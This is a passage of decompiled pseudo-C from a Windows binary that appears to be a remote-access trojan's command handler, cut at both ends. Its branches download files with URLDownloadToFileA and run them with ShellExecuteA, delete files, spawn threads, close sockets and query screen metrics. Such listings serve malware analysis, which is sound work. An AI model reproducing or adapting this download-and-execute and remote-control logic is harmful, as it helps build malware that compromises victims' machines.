0x47e3a4;\n        uStack1536 = 0x47a65d;\n        uStack1536 = fcn.004059dc();\n        uStack1540 = 0;\n        puStack1544 = 0x47a665;\n        sub.URLMON.DLL_URLDownloadToFileA();\n        puStack1544 = 0x47a675;\n        fcn.0048b61c();\n        piStack1548 = var_ch;\n        piStack1552 = 0x47e3b8;\n        uStack1556 = 0x47a693;\n        puStack1544 = &fcn.00476010::var_588h;\n        fcn.004058e0();\n        uStack1556 = 0x47a69e;\n        cVar1 = fcn.0040a274();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = piStack1552;\n            goto code_r0x0047d309;\n        }\n        uStack1556 = 5;\n        uStack1560 = 0;\n        var_618h = 0;\n        var_61ch = 0x47a6c5;\n        fcn.0048b61c();\n        var_61ch = in_stack_fffffa34;\n        var_620h = var_ch;\n        uStack1576 = 0x47e3b8;\n        uStack1580 = 0x47a6e3;\n        fcn.004058e0();\n        uStack1580 = 0x47a6ee;\n        uStack1580 = fcn.004059dc();\n        uStack1584 = 0x47d59c;\n        uStack1588 = 0;\n        puStack1592 = 0x47a6fb;\n        sub.shell32.dll_ShellExecuteA();\n        uVar11 = 1;\n        puStack1592 = 0x47a702;\n        fcn.00475980();\n    }\n    puStack1592 = 0x47a70f;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1592 = 0x47a729;\n        fcn.00405864();\n        puStack1592 = 0x47a734;\n        fcn.00475d98();\n    }\n    puStack1592 = 0x47a741;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1592 = 0x47a74e;\n        fcn.00470c84();\n        uVar11 = puStack1492 == NULL;\n        if (!uVar11) {\n            puStack1592 = 0x47a762;\n            fcn.00470c84();\n            puStack1592 = 0x47a778;\n            fcn.00405864();\n            puStack1592 = 0x47a783;\n            fcn.00475d98();\n        }\n    }\n    puStack1592 = &stack0xfffffa20;\n    uStack1596 = 0x47a79c;\n    fcn.00405a44();\n    uStack1596 = 0x47a7ac;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1596 = 0x47a7c0;\n        fcn.00405a84();\n        uStack1596 = 0x47a7c5;\n        fcn.00431a18();\n        uStack1596 = 0x47a7cd;\n        fcn.004315a0();\n    }\n    uStack1596 = 0x47a7da;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1596 = 5;\n        uStack1600 = 0;\n        uStack1612 = 0x47d59c;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048b9f0();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0048b9f0();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        uVar11 = 1;\n        fcn.00486590();\n        fcn.004865e8();\n        fcn.00486594();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44();\n    puStack1628 = 0x47a8c8;\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        puStack1628 = &fcn.00476010::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1640 = 0x47a971;\n        fcn.0046f7fc();\n        puStack1640 = 0x47a982;\n        fcn.00475f44(arg_8h_00);\n    }\n    puStack1640 = 0x47a99c;\n    fcn.00405a44();\n    puStack1640 = 0x47a9ac;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1640 = 0x47a9c4;\n        fcn.00405a84();\n        puStack1640 = &fcn.00476010::var_ch;\n        piStack1644 = 0x47a9d5;\n        fcn.00405b28();\n        piStack1644 = 0x47a9e5;\n        fcn.00405a44();\n        piStack1644 = 0x47a9f2;\n        fcn.00405b28();\n        piStack1644 = 0x47aa01;\n        fcn.00405a84();\n        piStack1644 = 0x47aa0c;\n        fcn.004055c8();\n        piStack1644 = 0x47aa16;\n        fcn.00405530();\n        piStack1644 = var_ch;\n        uStack1648 = 0x47e4ac;\n        puStack1652 = var_10h;\n        uStack1656 = 0x47aa30;\n        fcn.004058e0();\n        puStack456 = *0x495808;\n        uVar11 = 1;\n        uStack1656 = 0x47aa4d;\n        fcn.00403af4();\n        uStack1656 = 1000;\n        piStack1660 = 0x47aa57;\n        sub.kernel32.dll_Sleep_2();\n        piStack1660 = **0x495af4;\n        puStack1664 = 0x47aa64;\n        sub.wsock32.dll_closesocket();\n    }\n    puStack1664 = &stack0xfffffa0c;\n    puStack1668 = 0x47aa7d;\n    fcn.00405a44();\n    puStack1668 = 0x47aa8d;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1668 = 0x47aaa5;\n        fcn.00405a84();\n        puStack1668 = &fcn.00476010::var_ch;\n        uStack1672 = 0x47aab6;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        uStack1672 = 0x47aac6;\n        fcn.00405a44();\n        uStack1672 = 0x47aad3;\n        fcn.00405b28();\n        uStack1672 = 0x47aae2;\n        fcn.00405a84();\n        uStack1672 = 0x47aaed;\n        fcn.004055c8();\n        uStack1672 = 8;\n        uStack1676 = 0x40;\n        puStack1680 = 0x47aaf6;\n        iStack1688 = sub.kernel32.dll_LocalAlloc_1();\n        puStack1680 = 0x47ab04;\n        fcn.00405584();\n        puStack1680 = 0x47ab0c;\n        uVar3 = fcn.00409ee4();\n        *(iStack1688 + 4) = uVar3;\n        puStack1680 = &fcn.00476010::var_4h;\n        uStack1684 = 0;\n        pcStack1692 = fcn.00483f84;\n        uStack1696 = 0;\n        uStack1700 = 0;\n        uStack1704 = 0x47ab24;\n        uStack1704 = sub.kernel32.dll_CreateThread_1();\n        puStack1708 = 0x47ab2a;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1708 = &stack0xfffffa08;\n    puStack1712 = 0x47ab43;\n    fcn.00405a44();\n    puStack1712 = 0x47ab53;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1712 = 0x47ab6b;\n        fcn.00405a84();\n        puStack1712 = &stack0xfffffa00;\n        puStack1716 = 0x47ab84;\n        fcn.00405a44();\n        puStack1716 = 0x47ab95;\n        fcn.004097e4();\n        puStack1716 = 0x47aba5;\n        fcn.00405974();\n        if (!uVar11) {\n            puStack1716 = &stack0xfffff9f8;\n            uStack1720 = 0x47abc0;\n            fcn.00405a44();\n            uStack1720 = 0x47abd1;\n            fcn.004097e4();\n            uStack1720 = 0x47abe1;\n            fcn.00405974();\n            if (!uVar11) {\n                uStack1720 = 0x47abf3;\n                fcn.00405864();\n            }\n        }\n        uStack1720 = 5;\n        uStack1724 = 0;\n        uStack1728 = 0;\n        puStack1732 = 0x47ac01;\n        puStack1732 = fcn.004059dc();\n        puStack1736 = 0x47d59c;\n        uStack1740 = 0;\n        uStack1744 = 0x47ac0e;\n        sub.shell32.dll_ShellExecuteA();\n        uStack1744 = 0x47e518;\n        puStack1748 = var_8h;\n        uStack1752 = 0x47e534;\n        piStack1756 = 0x47ac26;\n        fcn.0048d6c4();\n        piStack1756 = piStack1552;\n        puStack1760 = 0x47ac3c;\n        fcn.004058e0();\n        puStack1760 = 0x47ac47;\n        fcn.00475d98();\n    }\n    puStack1760 = 0x47ac54;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1760 = 0x47ac61;\n        fcn.0048d6c4();\n        puStack1760 = 0x47ac77;\n        fcn.00405864();\n        puStack1760 = 0x47ac82;\n        fcn.00475d98();\n    }\n    puStack1760 = &fcn.00476010::var_618h;\n    uStack1764 = 0x47ac9b;\n    fcn.00405a44();\n    uStack1764 = 0x47acab;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1764 = 0x47acbf;\n        fcn.00405a84();\n        uStack1764 = 5;\n        uStack1768 = 0;\n        uStack1772 = 0;\n        uStack1776 = 0x47accd;\n        uStack1776 = fcn.004059dc();\n        uStack1780 = 0x47d59c;\n        uStack1784 = 0;\n        uStack1788 = 0x47acda;\n        sub.shell32.dll_ShellExecuteA();\n        uStack1788 = 0x47e5ac;\n        puStack1792 = var_8h;\n        uStack1796 = 0x47e5cc;\n        piStack1800 = 0x47acf2;\n        fcn.0048d6c4();\n        piStack1800 = var_620h;\n        puStack1804 = 0x47ad08;\n        fcn.004058e0();\n        puStack1804 = 0x47ad13;\n        fcn.00475d98();\n    }\n    puStack1804 = 0x47ad20;\n    fcn.00405974();\n    if (uVar11) {\n        while( true ) {\n            puStack1804 = 0x47ad3d;\n            iVar4 = fcn.00484a2c();\n            uVar11 = iVar4 == 0;\n            if (iVar4 < 1) break;\n            puStack1804 = 0x47ad2e;\n            fcn.00484a2c();\n            puStack1804 = 0x47ad33;\n            fcn.00484e64();\n        }\n        puStack1804 = 0x47ad4c;\n        fcn.0048d6c4();\n        puStack1804 = 0x47ad62;\n        fcn.00405864();\n        puStack1804 = 0x47ad6d;\n        fcn.00475d98();\n        puStack1804 = 0x47ad72;\n        sub.kernel32.dll_GetCurrentProcessId();\n        puStack1804 = 0x47ad77;\n        fcn.00484e64();\n    }\n    puStack1804 = 0x47ad84;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1804 = 0x47ad91;\n        fcn.0048d6c4();\n        puStack1804 = 0x47ada7;\n        fcn.00405864();\n        puStack1804 = 0x47adb2;\n        fcn.00475d98();\n        uVar11 = 1;\n        puStack1804 = 0x47adb9;\n        fcn.00475980();\n    }\n    puStack1804 = &stack0xfffff9c8;\n    var_70ch = 0x47add2;\n    fcn.00405a44();\n    var_70ch = 0x47ade2;\n    fcn.00405974();\n    if (uVar11) {\n        var_70ch = 0x47adfa;\n        fcn.00405a84();\n        var_70ch = *0x47d4b8;\n        var_710h = &stack0xfffff9c4;\n        uVar11 = 1;\n        puStack1816 = 0x47ae18;\n        fcn.0040ef4c(var_710h, var_70ch);\n        puStack1816 = 0x47ae26;\n        fcn.004055c8();\n        puStack1816 = &stack0xfffff9c0;\n        uStack1820 = 0x47ae3b;\n        fcn.0040986c();\n        uStack1820 = 0x47ae50;\n        fcn.00405a44();\n        uStack1820 = 0x47ae60;\n        fcn.00405974();\n        if (!uVar11) {\n            uStack1820 = 0x47ae72;\n            fcn.00405864();\n        }\n        puVar9 = var_8h;\n        if (var_8h != NULL) {\n            puVar9 = var_8h[-1];\n        }\n        if (*(var_8h + -1 + puVar9) == '/') {\n            puStack460 = var_8h;\n            if (var_8h != NULL) {\n                puStack460 = var_8h[-1];\n            }\n            uStack1820 = 0x47aec6;\n            fcn.00405a84();\n        }\n        uStack1820 = 0x47aed3;\n        fcn.0048a1bc();\n        uStack1820 = 0;\n        uStack1824 = 0;\n        uStack1828 = 0x47aee7;\n        fcn.0048b61c();\n        uStack1828 = uStack1612;\n        piStack1832 = piStack40;\n        uStack1836 = 0x47e3b8;\n        uStack1840 = 0x47af05;\n        fcn.004058e0();\n        uStack1840 = 0x47af10;\n        uStack1840 = fcn.004059dc();\n        uStack1844 = 0x47af19;\n        uStack1844 = fcn.004059dc();\n        piStack1848 = NULL;\n        puStack1852 = 0x47af21;\n        iVar4 = sub.URLMON.DLL_URLDownloadToFileA();\n        if (iVar4 != 0) {\n            puStack1852 = 0x47af30;\n            fcn.0048d6c4();\n            puStack1852 = 0x47af46;\n            fcn.00405864();\n            puStack1852 = 0x47af51;\n            fcn.00475d98();\n            *in_FS_OFFSET = piStack1848;\n            goto code_r0x0047d309;\n        }\n        puStack1852 = 0x47af6e;\n        fcn.0048b61c();\n        puStack1852 = puStack1628;\n        piStack1856 = piStack40;\n        piStack1860 = 0x47e3b8;\n        uStack1864 = 0x47af8c;\n        fcn.004058e0();\n        uStack1864 = 0x47af97;\n        cVar1 = fcn.0040a274();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = piStack1860;\n            goto code_r0x0047d309;\n        }\n        uStack1864 = 0x47afb3;\n        fcn.0048d6c4();\n        uStack1864 = 0x47afc9;\n        fcn.00405864();\n        uStack1864 = 0x47afd4;\n        fcn.00475d98();\n        uStack1864 = 5;\n        uStack1868 = 0;\n        uStack1872 = 0;\n        piStack1876 = 0x47afea;\n        fcn.0048b61c();\n        piStack1876 = piStack1644;\n        piStack1880 = piStack40;\n        uStack1884 = 0x47e3b8;\n        uStack1888 = 0x47b008;\n        fcn.004058e0();\n        uStack1888 = 0x47b013;\n        uStack1888 = fcn.004059dc();\n        uStack1892 = 0x47d59c;\n        uStack1896 = 0;\n        puStack1900 = 0x47b020;\n        sub.shell32.dll_ShellExecuteA();\n        uVar11 = 1;\n        puStack1900 = 0x47b027;\n        fcn.00475980();\n    }\n    puStack1900 = &stack0xfffff990;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        uVar11 = 1;\n        puStack1912 = 0x47b091;\n        fcn.0040ef4c(&stack0xfffff98c, *0x47d4b8);\n        puStack1912 = 0x47b09f;\n        fcn.004055c8();\n        puStack1912 = &stack0xfffff988;\n        iStack1916 = 0x47b0b4;\n        fcn.0040986c();\n        iStack1916 = 0x47b0c9;\n        fcn.00405a44();\n        iStack1916 = 0x47b0d9;\n        fcn.00405974();\n        if (!uVar11) {\n            iStack1916 = 0x47b0eb;\n            fcn.00405864();\n        }\n        piVar8 = var_ch;\n        if (var_ch != NULL) {\n            piVar8 = var_ch[-1];\n        }\n        if (*(var_ch + -1 + piVar8) == '/') {\n            piStack464 = var_ch;\n            if (var_ch != NULL) {\n                piStack464 = var_ch[-1];\n            }\n            piStack468 = var_ch;\n            if (var_ch != NULL) {\n                piStack468 = var_ch[-1];\n            }\n            iStack1916 = 0x47b15b;\n            fcn.00405a84();\n        }\n        iStack1916 = 0x47b166;\n        fcn.0048d6c4();\n        iStack1916 = 0x47b17c;\n        fcn.00405864();\n        iStack1916 = 0x47b187;\n        fcn.00475d98();\n        iStack1916 = 0;\n        iStack1920 = 0;\n        puStack1924 = 0x47b196;\n        fcn.0048a3f0();\n        puStack1924 = &stack0xfffff978;\n        uStack1928 = 0x47b1ab;\n        fcn.0048a33c();\n        puStack1924 = 0x47b1b7;\n        fcn.00405818();\n        puStack1924 = 0x47b1c2;\n        puStack1924 = fcn.004059dc();\n        uStack1928 = 0x47b1cb;\n        uStack1928 = fcn.004059dc();\n        piStack1932 = NULL;\n        uStack1936 = 0x47b1d3;\n        iVar4 = sub.URLMON.DLL_URLDownloadToFileA();\n        uVar11 = iVar4 == 0;\n        if (!uVar11) {\n            uStack1936 = 0x47b1e2;\n            fcn.0048d6c4();\n            uStack1936 = 0x47b1f8;\n            fcn.00405864();\n            uStack1936 = 0x47b203;\n            fcn.00475d98();\n            *in_FS_OFFSET = piStack1932;\n            goto code_r0x0047d309;\n        }\n        uStack1936 = 0x47b21b;\n        fcn.0048d6c4();\n        uStack1936 = 0x47b231;\n        fcn.00405864();\n        uStack1936 = 0x47b23c;\n        fcn.00475d98();\n        uStack1936 = 5;\n        uStack1940 = 0;\n        uStack1944 = 0;\n        puStack1948 = 0x47b24d;\n        fcn.0048a3f0();\n        puStack1948 = &stack0xfffff960;\n        uStack1952 = 0x47b262;\n        fcn.0048a33c();\n        puStack1948 = 0x47b26e;\n        fcn.00405818();\n        puStack1948 = 0x47b279;\n        puStack1948 = fcn.004059dc();\n        uStack1952 = 0x47d59c;\n        uStack1956 = 0;\n        puStack1960 = 0x47b286;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    puStack1960 = 0x47b293;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1960 = &fcn.00476010::var_4h;\n        puStack1964 = NULL;\n        var_7ach = NULL;\n        sub.kernel32.dll_CreateThread_1();\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1960 = 0x47b2be;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1960 = 0x47b2c8;\n        fcn.00472fa4();\n        puStack1960 = 0x47b2db;\n        fcn.00405864();\n        puStack1960 = 0x47b2e6;\n        fcn.00475d98();\n    }\n    puStack1960 = &stack0xfffff954;\n    puStack1964 = 0x47b2ff;\n    fcn.00405a44();\n    puStack1964 = 0x47b30f;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1964 = 0x47b327;\n        fcn.00405a84();\n        puStack1964 = &fcn.00476010::var_ch;\n        var_7ach = 0x47b338;\n        fcn.00405b28();\n        var_7ach = 0x47b348;\n        fcn.00405a44();\n        var_7ach = 0x47b355;\n        fcn.00405b28();\n        var_7ach = 0x47b364;\n        fcn.00405a84();\n        var_7ach = &fcn.00476010::var_10h;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b3a8();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b3a8();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.00466cd4();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b300();\n        fcn.0048a3f0();\n        fcn.00405818();\n        puStack472 = puStack1732;\n        fcn.004059dc();\n        iVar4 = sub.kernel32.dll_DeleteFileA();\n        puStack476 = puStack476 & 0xffffff | 1 - (iVar4 == 0) << 0x18;\n        fcn.0048a3f0();\n        fcn.00405818();\n        puStack480 = puStack1736;\n        fcn.004059dc();\n        iVar4 = sub.kernel32.dll_DeleteFileA();\n        uVar11 = iVar4 == 0;\n        uStack484 = uStack484 & 0xffffff | (iVar4 != 0) << 0x18;\n        fcn.00466f74();\n        fcn.00475f44(arg_8h);\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405584();\n        fcn.00473610();\n        fcn.0048bb64();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d78();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d78();\n        fcn.004058e0();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00409ee4();\n        fcn.00409ee4();\n        fcn.00482f10();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0045f524();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        cVar1 = fcn.0048c384();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.00475d98();\n        }\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048c3dc();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00409ee4();\n        fcn.00461a20();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.ole32.dll_CoInitialize();\n        piVar8 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff79c;\n        fcn.0042c0c8();\n        fcn.00415b74();\n        fcn.00411660(0, &fcn.00476010::var_38h, 0x47ea80, &fcn.00476010::var_8h);\n        fcn.00416324();\n        *in_FS_OFFSET = piVar8;\n        fcn.00475d98();\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00472d8c();\n        fcn.00475f44(puVar13);\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405818();\n        fcn.0048d03c(0x47eabc);\n        fcn.0048d340(0x47eae0, var_8h, 0x47ead4, piStack1832);\n        fcn.0048d340(0x47d4b4, uStack1836);\n        fcn.0048d278(0x47d4b4, uStack1840);\n        uVar11 = 1;\n        fcn.0048d16c(0x47d4b4, uStack1844);\n        fcn.0048d16c(0x47eaec, piStack1848);\n        fcn.004058e0(0x47eaf8, puStack1852);\n        fcn.00475d98();\n    }\n    fcn.00405a44(&stack0xfffff8c0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048b61c();\n        fcn.004058e0(var_8h, 0x47debc, uStack1864);\n        piStack488 = piStack1860;\n        uVar3 = fcn.004059dc();\n        iVar4 = sub.kernel32.dll_DeleteFileA(uVar3);\n        uVar2 = 1 - (iVar4 == 0);\n        puStack492 = puStack492 & 0xffffff | uVar2 << 0x18;\n        uVar11 = uVar2 == 0;\n        if (!uVar11) {\n            fcn.00475d98();\n        }\n    }\n    fcn.00405a44(&stack0xfffff8b4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        cVar1 = fcn.0040a274();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = &fcn.00476010::var_14h;\n            goto code_r0x0047d309;\n        }\n        puVar13 = &stack0xfffff8b0;\n        fcn.00409ee4(puVar13, &stack0xfffffffc);\n        fcn.0048d4ec(puVar13);\n        fcn.00475f44(puVar13);\n    }\n    fcn.00405a44(&stack0xfffff8ac);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.00476010::var_14h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.004880e4(var_18h);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00487ecc();\n    }\n    fcn.00405a44(&stack0xfffff8a8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00487cc8();\n    }\n    fcn.00405a44(&stack0xfffff8a4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.00476010::var_18h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puVar9 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n        uVar3 = fcn.00409ee4();\n        *puVar9 = uVar3;\n        uVar3 = fcn.004844c8();\n        puVar9[1] = uVar3;\n        uVar3 = fcn.004844c8();\n        puVar9[2] = uVar3;\n        uVar3 = fcn.004844c8();\n        puVar9[3] = uVar3;\n        fcn.00405584();\n        uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.004846ec, puVar9, 0, &fcn.00476010::var_4h);\n        sub.kernel32.dll_CloseHandle_1(uVar3);\n    }\n    fcn.00405a44(&stack0xfffff8a0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.00476010::var_ch);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00480aa8();\n        fcn.00480a28();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff89c);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.00476010::var_10h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00462000();\n        fcn.00409ee4();\n        fcn.0046207c();\n        fcn.00462080();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.00462078();\n        }\n        else {\n            uVar11 = 1;\n            fcn.00462078();\n        }\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff898);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00480344();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff894);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00409ee4();\n        fcn.00480fc4();\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff890);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        piStack2368 = &fcn.00476010::var_10h;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041f9e0();\n        **0x495a5c = iVar4;\n        *(**0x495a5c + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.00462000();\n        fcn.00409ee4();\n        fcn.0046207c();\n        fcn.00462080();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.00462078();\n        }\n        else {\n            uVar11 = 1;\n            fcn.00462078();\n        }\n        fcn.0041fe9c();\n    }\n    fcn.00405a44(&stack0xfffff88c);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x495a5c == 0,  !uVar11)) {\n        fcn.0041fec4();\n    }\n    fcn.00405a44(&stack0xfffff888);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        uVar11 = **0x4958f4 == 0;\n        if (!uVar11) {\n            cVar1 = fcn.0048a188();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                fcn.0041fec4();\n            }\n        }\n        iVar4 = fcn.0041f9e0();\n        **0x4958f4 = iVar4;\n        *(**0x4958f4 + 0xf) = 1;\n        fcn.0041fbec();\n        fcn.0048a138();\n        fcn.00409ee4();\n        fcn.0048a184();\n        fcn.0041fe9c();\n    }\n    piVar8 = &stack0xfffff884;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        if (**0x4958f4 == 0) {\n            *in_FS_OFFSET = piVar8;\n            goto code_r0x0047d309;\n        }\n        cVar1 = fcn.0048a188();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = piVar8;\n            goto code_r0x0047d309;\n        }\n        fcn.0048a0a4();\n    }\n    piVar8 = &stack0xfffff880;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        if (**0x4958f4 == 0) {\n            *in_FS_OFFSET = piVar8;\n            goto code_r0x0047d309;\n        }\n        cVar1 = fcn.0048a188();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = piVar8;\n            goto code_r0x0047d309;\n        }\n        fcn.0041fec4();\n    }\n    fcn.00405a44(&stack0xfffff87c);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00476010::var_14h);\n        fcn.00405a44();\n        